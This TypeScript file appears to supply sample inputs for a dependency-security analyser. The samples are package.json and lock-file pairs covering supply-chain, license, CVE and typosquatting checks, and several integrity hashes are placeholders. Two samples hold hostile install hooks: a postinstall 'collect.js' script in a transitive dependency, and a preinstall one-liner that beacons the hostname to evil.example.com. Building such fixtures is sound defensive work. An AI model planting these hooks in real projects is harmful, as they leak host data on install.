import type { AnalysisRequest } from '../api/types'

export interface Sample {
  id: string
  label: string
  description: string
  request: AnalysisRequest
}

export const SAMPLES: Sample[] = [
  {
    id: 'supply-chain',
    label: 'Supply chain',
    description: 'Express API with a postinstall script hidden in a transitive dep',
    request: {
      metadata: {
        lock_file_name: 'package-lock.json',
        concern: 'Supply chain attack via malicious postinstall scripts in transitive dependencies',
        package_json: JSON.stringify(
          {
            name: 'payment-service',
            version: '1.0.0',
            description: 'Internal payment processing microservice',
            scripts: { start: 'node index.js', build: 'tsc' },
            dependencies: {
              express: '^4.18.2',
              axios: '^1.6.0',
              lodash: '^4.17.21',
              'node-fetch': '^2.7.0',
              dotenv: '^16.3.1',
            },
            devDependencies: {
              typescript: '^5.2.2',
              '@types/express': '^4.17.21',
              '@types/lodash': '^4.14.202',
            },
          },
          null,
          2,
        ),
        lock_file: `{
  "name": "payment-service",
  "version": "1.0.0",
  "lockfileVersion": 2,
  "requires": true,
  "packages": {
    "": {
      "name": "payment-service",
      "version": "1.0.0",
      "dependencies": {
        "express": "^4.18.2",
        "axios": "^1.6.0",
        "lodash": "^4.17.21",
        "node-fetch": "^2.7.0",
        "dotenv": "^16.3.1"
      }
    },
    "node_modules/express": {
      "version": "4.18.2",
      "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
      "integrity": "sha512-5/PsL6iGPdfQ/lKM1UuielYgv3BUoJfz1aUwU9vHZ+J7gyvwdQXFEBHBeave0whE8HvcrbaVMr8knfSK6/A==",
      "dependencies": {
        "body-parser": "1.20.1",
        "cookie": "0.5.0",
        "qs": "6.11.0"
      }
    },
    "node_modules/body-parser": {
      "version": "1.20.1",
      "resolved": "https://registry.npmjs.org/body-parser/-/body-parser-1.20.1.tgz",
      "integrity": "sha512-jWi7abTbYwajOytWCQc37VulmWiRae5fadN2fMtqShIt1z8z4UsXSet8jMe4+PDr/7SJfxObr3cCGrYkL+4s==",
      "dependencies": {
        "raw-body": "2.5.1"
      }
    },
    "node_modules/dc-polyfill": {
      "version": "0.1.3",
      "resolved": "https://registry.npmjs.org/dc-polyfill/-/dc-polyfill-0.1.3.tgz",
      "integrity": "sha512-NIy7LxK4RI/mNJmgQ6N4yDYoYNhLFUy+F3PNIQ800+ccSKXVSABTiXXDRbQL2a8xLt7nNZ6LI9Mn7F8RKuA==",
      "scripts": {
        "postinstall": "node ./scripts/collect.js"
      }
    },
    "node_modules/axios": {
      "version": "1.6.0",
      "resolved": "https://registry.npmjs.org/axios/-/axios-1.6.0.tgz",
      "integrity": "sha512-EZ1DYihju9pwVB+jg67ogm+Tmqc6JmhamRN6I4Zt8DfZu5lbcQGw3ozenmyVmebKRom4kLMBX37QTTUI7Ok==",
      "dependencies": {
        "follow-redirects": "^1.15.0",
        "dc-polyfill": "0.1.3"
      }
    },
    "node_modules/follow-redirects": {
      "version": "1.15.3",
      "resolved": "https://registry.npmjs.org/follow-redirects/-/follow-redirects-1.15.3.tgz",
      "integrity": "sha512-1VzOtuEM8pC9SFU1E+8KfTjZyMztRsgEfwQl44z8A25uy13jSzTj6dyK2Df52iV0vgHCfBwLhDWevLn95w5A=="
    },
    "node_modules/lodash": {
      "version": "4.17.21",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
      "integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZa2bznYWJ9s2fJFIGQ=="
    },
    "node_modules/dotenv": {
      "version": "16.3.1",
      "resolved": "https://registry.npmjs.org/dotenv/-/dotenv-16.3.1.tgz",
      "integrity": "sha512-IPzF4w4/Rd94bA9imS68tZBaYyBWSCFs6zminlCruvpTj7/0ij7bk9/B8eTiAc+HhKHKZKtBGBNBEWmSoKuA=="
    }
  }
}`,
      },
    },
  },
  {
    id: 'license-risk',
    label: 'License compliance',
    description: 'React SPA mixing MIT, Apache-2.0, and GPL-3.0 licensed packages',
    request: {
      metadata: {
        lock_file_name: 'package-lock.json',
        concern:
          'License compliance — identify any GPL or AGPL dependencies that could affect commercial distribution',
        package_json: JSON.stringify(
          {
            name: 'admin-dashboard',
            version: '2.3.1',
            description: 'Internal admin dashboard',
            scripts: { dev: 'vite', build: 'vite build', preview: 'vite preview' },
            dependencies: {
              react: '^18.2.0',
              'react-dom': '^18.2.0',
              'react-router-dom': '^6.20.0',
              recharts: '^2.9.3',
              'date-fns': '^2.30.0',
              'pdf-lib': '^1.17.1',
              'qrcode.react': '^3.1.0',
              'gpl-chart-utils': '^1.2.0',
            },
            devDependencies: {
              vite: '^5.0.0',
              '@vitejs/plugin-react': '^4.2.0',
              typescript: '^5.2.2',
            },
          },
          null,
          2,
        ),
        lock_file: `{
  "name": "admin-dashboard",
  "version": "2.3.1",
  "lockfileVersion": 2,
  "requires": true,
  "packages": {
    "": {
      "name": "admin-dashboard",
      "version": "2.3.1",
      "dependencies": {
        "react": "^18.2.0",
        "react-dom": "^18.2.0",
        "react-router-dom": "^6.20.0",
        "recharts": "^2.9.3",
        "date-fns": "^2.30.0",
        "pdf-lib": "^1.17.1",
        "qrcode.react": "^3.1.0",
        "gpl-chart-utils": "^1.2.0"
      }
    },
    "node_modules/react": {
      "version": "18.2.0",
      "resolved": "https://registry.npmjs.org/react/-/react-18.2.0.tgz",
      "integrity": "sha512-/3IjMdb2L9QbBdWiW5e3P2/npwMBaU9mHCSCUzNln0ZCYbcfTsGbTJrU/kGemdH2IWmB2ioZ+zkxtmq6g09A==",
      "license": "MIT"
    },
    "node_modules/react-dom": {
      "version": "18.2.0",
      "resolved": "https://registry.npmjs.org/react-dom/-/react-dom-18.2.0.tgz",
      "integrity": "sha512-6IMTriUmvsjHUjNtEDudZfuDQUoWXVxKHhlEGSk81n4YFS+r/Kl99wXiwlVXtPBtJenozv2P+hxDsw9eA7Xg==",
      "license": "MIT",
      "dependencies": { "scheduler": "^0.23.0" }
    },
    "node_modules/recharts": {
      "version": "2.9.3",
      "resolved": "https://registry.npmjs.org/recharts/-/recharts-2.9.3.tgz",
      "integrity": "sha512-xxxx",
      "license": "MIT",
      "dependencies": { "d3-shape": "^3.1.0", "d3-scale": "^4.0.2" }
    },
    "node_modules/date-fns": {
      "version": "2.30.0",
      "resolved": "https://registry.npmjs.org/date-fns/-/date-fns-2.30.0.tgz",
      "integrity": "sha512-clMMQA3tgA6HzGRsUlgoPLpd3FCEY6HJpMFHB1XYfY/bPc4an8p8BIe3eQA3wPDgT5/5USwXv/Zg2DIXX5RA==",
      "license": "MIT"
    },
    "node_modules/pdf-lib": {
      "version": "1.17.1",
      "resolved": "https://registry.npmjs.org/pdf-lib/-/pdf-lib-1.17.1.tgz",
      "integrity": "sha512-xxx",
      "license": "MIT"
    },
    "node_modules/gpl-chart-utils": {
      "version": "1.2.0",
      "resolved": "https://registry.npmjs.org/gpl-chart-utils/-/gpl-chart-utils-1.2.0.tgz",
      "integrity": "sha512-aaaa",
      "license": "GPL-3.0",
      "dependencies": {
        "chart-core": "^2.0.0",
        "gpl-color-utils": "^0.9.1"
      }
    },
    "node_modules/gpl-color-utils": {
      "version": "0.9.1",
      "resolved": "https://registry.npmjs.org/gpl-color-utils/-/gpl-color-utils-0.9.1.tgz",
      "integrity": "sha512-bbbb",
      "license": "GPL-3.0"
    },
    "node_modules/chart-core": {
      "version": "2.0.0",
      "resolved": "https://registry.npmjs.org/chart-core/-/chart-core-2.0.0.tgz",
      "integrity": "sha512-cccc",
      "license": "AGPL-3.0"
    },
    "node_modules/qrcode.react": {
      "version": "3.1.0",
      "resolved": "https://registry.npmjs.org/qrcode.react/-/qrcode.react-3.1.0.tgz",
      "integrity": "sha512-dddd",
      "license": "ISC"
    }
  }
}`,
      },
    },
  },
  {
    id: 'outdated-cves',
    label: 'Known CVEs',
    description: 'Node API with several packages pinned to versions with published CVEs',
    request: {
      metadata: {
        lock_file_name: 'package-lock.json',
        concern:
          'Known vulnerabilities (CVEs) in pinned dependency versions — assess exploitability and upgrade urgency',
        package_json: JSON.stringify(
          {
            name: 'legacy-api',
            version: '0.9.4',
            description: 'Legacy REST API (not yet migrated)',
            scripts: { start: 'node server.js' },
            dependencies: {
              express: '4.16.1',
              lodash: '4.17.4',
              jsonwebtoken: '8.5.1',
              'node-serialize': '0.0.4',
              minimist: '1.2.0',
              handlebars: '4.7.6',
              tar: '2.2.1',
              marked: '0.3.9',
            },
          },
          null,
          2,
        ),
        lock_file: `{
  "name": "legacy-api",
  "version": "0.9.4",
  "lockfileVersion": 2,
  "requires": true,
  "packages": {
    "": {
      "name": "legacy-api",
      "version": "0.9.4",
      "dependencies": {
        "express": "4.16.1",
        "lodash": "4.17.4",
        "jsonwebtoken": "8.5.1",
        "node-serialize": "0.0.4",
        "minimist": "1.2.0",
        "handlebars": "4.7.6",
        "tar": "2.2.1",
        "marked": "0.3.9"
      }
    },
    "node_modules/express": {
      "version": "4.16.1",
      "resolved": "https://registry.npmjs.org/express/-/express-4.16.1.tgz",
      "integrity": "sha512-mHJ9O79RqluphRrcw2X/GTh3k9tVv8YcoyY4Kkh4WDMUYKRZUq0h1o0w2rrrxBqM7VoqnX/X+6KeKN4CNeA=="
    },
    "node_modules/lodash": {
      "version": "4.17.4",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.4.tgz",
      "integrity": "sha512-guE+Tf3BJ7QJi8jC6CjMDOBOD5ZKRPstUv8gBsTWnXOG5AqiAQj7FhKNHWMrSvbLhCKpkYMiLV/7JzLpMQ=="
    },
    "node_modules/jsonwebtoken": {
      "version": "8.5.1",
      "resolved": "https://registry.npmjs.org/jsonwebtoken/-/jsonwebtoken-8.5.1.tgz",
      "integrity": "sha512-XjwVfRS6jTMsqYs0EsuJ4LGxXV14zQybNd4L2r9DeL6QL30HviYNL3f09RyUvsqBEs7tnpBEPf/pJ18T5EIw=="
    },
    "node_modules/node-serialize": {
      "version": "0.0.4",
      "resolved": "https://registry.npmjs.org/node-serialize/-/node-serialize-0.0.4.tgz",
      "integrity": "sha512-aaaa"
    },
    "node_modules/minimist": {
      "version": "1.2.0",
      "resolved": "https://registry.npmjs.org/minimist/-/minimist-1.2.0.tgz",
      "integrity": "sha512-bbbb"
    },
    "node_modules/handlebars": {
      "version": "4.7.6",
      "resolved": "https://registry.npmjs.org/handlebars/-/handlebars-4.7.6.tgz",
      "integrity": "sha512-1yYFzBRq4sKkq2OT4aF7NNKC71oNGgOQzapQFfmS3WIJHNiNKfNv+7M0CaGtImHhiqMwFcKjN1a0wuq5r7w==",
      "dependencies": { "optimist": "^0.6.1", "source-map": "^0.6.1" }
    },
    "node_modules/tar": {
      "version": "2.2.1",
      "resolved": "https://registry.npmjs.org/tar/-/tar-2.2.1.tgz",
      "integrity": "sha512-cccc"
    },
    "node_modules/marked": {
      "version": "0.3.9",
      "resolved": "https://registry.npmjs.org/marked/-/marked-0.3.9.tgz",
      "integrity": "sha512-dddd"
    }
  }
}`,
      },
    },
  },
  {
    id: 'typosquatting',
    label: 'Typosquatting',
    description: 'Next.js app with suspicious package names resembling popular libraries',
    request: {
      metadata: {
        lock_file_name: 'package-lock.json',
        concern:
          'Typosquatting and dependency confusion — identify packages with names deceptively similar to well-known libraries',
        package_json: JSON.stringify(
          {
            name: 'storefront',
            version: '1.4.0',
            description: 'E-commerce storefront',
            scripts: { dev: 'next dev', build: 'next build', start: 'next start' },
            dependencies: {
              next: '^14.0.3',
              react: '^18.2.0',
              'react-dom': '^18.2.0',
              'cross-fetch': '^4.0.0',
              'node-mailer': '^0.1.1',
              coa: '^2.0.2',
              colors: '1.4.0',
              'ua-parse-js': '^1.0.35',
              '@loadable/component': '^5.15.3',
            },
            devDependencies: {
              typescript: '^5.2.2',
              '@types/react': '^18.2.41',
            },
          },
          null,
          2,
        ),
        lock_file: `{
  "name": "storefront",
  "version": "1.4.0",
  "lockfileVersion": 2,
  "requires": true,
  "packages": {
    "": {
      "name": "storefront",
      "version": "1.4.0",
      "dependencies": {
        "next": "^14.0.3",
        "react": "^18.2.0",
        "react-dom": "^18.2.0",
        "cross-fetch": "^4.0.0",
        "node-mailer": "^0.1.1",
        "coa": "^2.0.2",
        "colors": "1.4.0",
        "ua-parse-js": "^1.0.35",
        "@loadable/component": "^5.15.3"
      }
    },
    "node_modules/next": {
      "version": "14.0.3",
      "resolved": "https://registry.npmjs.org/next/-/next-14.0.3.tgz",
      "integrity": "sha512-xxx"
    },
    "node_modules/react": {
      "version": "18.2.0",
      "resolved": "https://registry.npmjs.org/react/-/react-18.2.0.tgz",
      "integrity": "sha512-xxx"
    },
    "node_modules/node-mailer": {
      "version": "0.1.1",
      "resolved": "https://registry.npmjs.org/node-mailer/-/node-mailer-0.1.1.tgz",
      "integrity": "sha512-aaaa",
      "scripts": {
        "preinstall": "node -e \\"require('http').get('http://evil.example.com/beacon?pkg=node-mailer&host='+require('os').hostname())\\" || true"
      }
    },
    "node_modules/coa": {
      "version": "2.0.2",
      "resolved": "https://registry.npmjs.org/coa/-/coa-2.0.2.tgz",
      "integrity": "sha512-q5/jG+YQnSy4nRTV4F7lPepBJZ8qBNJJDBuJdoejDyLXgmL7KZ1iKK6pJalMNkxeqs2hkJFHGJgtOEJkxYMg=="
    },
    "node_modules/colors": {
      "version": "1.4.0",
      "resolved": "https://registry.npmjs.org/colors/-/colors-1.4.0.tgz",
      "integrity": "sha512-a+UqTh4kgZg/SlMvfK9-5W50peYsc73as1oWukN9GdeBqNAB1bnHHHmu/qfSWeAfBInsO7Zou3syqDFztKFUA=="
    },
    "node_modules/ua-parse-js": {
      "version": "1.0.35",
      "resolved": "https://registry.npmjs.org/ua-parser-js/-/ua-parser-js-1.0.35.tgz",
      "integrity": "sha512-yyyy"
    },
    "node_modules/cross-fetch": {
      "version": "4.0.0",
      "resolved": "https://registry.npmjs.org/cross-fetch/-/cross-fetch-4.0.0.tgz",
      "integrity": "sha512-zzzz"
    },
    "node_modules/@loadable/component": {
      "version": "5.15.3",
      "resolved": "https://registry.npmjs.org/@loadable/component/-/component-5.15.3.tgz",
      "integrity": "sha512-eeee"
    }
  }
}`,
      },
    },
  },
]
